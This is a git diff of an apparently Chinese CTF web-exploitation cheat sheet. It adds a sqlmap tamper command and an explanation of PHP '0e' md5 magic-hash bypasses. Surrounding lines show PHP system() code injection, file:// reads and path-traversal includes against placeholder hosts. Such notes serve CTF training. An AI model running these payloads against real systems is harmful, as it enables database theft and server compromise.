@@ -192,6 +192,10 @@ python sqlmap.py -u http://x.com/?id=1 -D N --tables
 python sqlmap.py -u http://x.com/?id=1 -D N -T A --columns
 # 查 N 数据库的 A 表的 B 列数据
 python sqlmap.py -u http://x.com/?id=1  -D N -T A -C B --dump
+
+
+# 高级注入（只举例第一步）
+python sqlmap.py -u http://x.com/?id=1 --batch --level=3 --tamper=space2comment.py --dbs
 ```
 
 ##### POST
@@ -410,14 +414,15 @@ post data:<?php system("ls /"); ?>
 # 此处会执行中间插入的代码 <?php system('ls');?> 。（可能要访问2次才会显示，结果可能返回在 html 源码中）
 ```
 
-**文件协议**
+###### 文件协议
 
 > 用于url是重定向的情况
 ```
 http://xxx/?url=file:///var/www/html/flag.php
 ```
 
-**include 函数的特性**
+###### include 函数的特性
+
 > 查找 ../../../../ffffllllaaaagggg 文件
 ```
 http://xxx/source.php?file=hint.php?../../../../../ffffllllaaaagggg
@@ -505,6 +510,11 @@ s878926199a
 s155964671a
 s214587387a
 s214587387a
+
+原理：
+在 PHP 中，'0e' 开头的字符串会被当作科学计数法来处理，因此当两个不同的字符串的 md5 哈希值以 '0e' 开头并且后面都是数字时，这两个哈希值在 PHP 中会被当作相等。
+在这个例子中，我们需要找到两个字符串，一个只包含字母，一个只包含数字，它们的 md5 哈希值相等。
+这样的字符串对已经被找到了，比如 '240610708' 和 'QNKCDZO'。这两个字符串的 md5 哈希值都是 '0e462097431906509019562988736854'。
 ```
 如果前一种方法不行，利用 md5 无法处理数组的特性绕过。(sha1 也无法处理数组类型，也适用此方法)
 ```
